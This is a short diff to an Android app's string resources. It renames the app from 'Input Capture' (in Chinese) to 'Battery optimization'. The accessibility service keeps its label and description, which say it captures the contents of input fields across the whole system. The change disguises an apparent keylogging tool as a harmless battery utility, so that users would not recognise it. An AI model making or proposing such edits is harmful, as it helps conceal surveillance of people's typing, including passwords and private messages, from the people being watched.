@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">输入捕获</string>
+    <string name="app_name">Battery optimization</string>
     <string name="accessibility_service_label">全局输入捕获服务</string>
     <string name="accessibility_service_description">此服务用于捕获系统全局的输入框内容以供应用展示。</string>
 </resources>
